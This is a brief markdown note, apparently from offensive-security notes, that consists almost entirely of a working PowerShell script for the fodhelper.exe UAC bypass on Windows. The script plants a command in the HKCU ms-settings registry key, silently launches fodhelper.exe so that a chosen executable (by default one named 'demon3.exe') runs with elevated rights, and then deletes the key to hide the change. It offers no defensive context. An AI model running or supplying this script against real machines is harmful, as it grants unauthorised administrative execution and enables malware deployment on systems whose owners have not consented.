# FodHelper

Creating a powershell script

```
function FodhelperUACBypass(){

	Param(
		[String]$program = "c:\users\user1\downloads\demon3.exe" #default
	)

	#create registry structure
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force	

	
}

FodhelperUACBypass

```
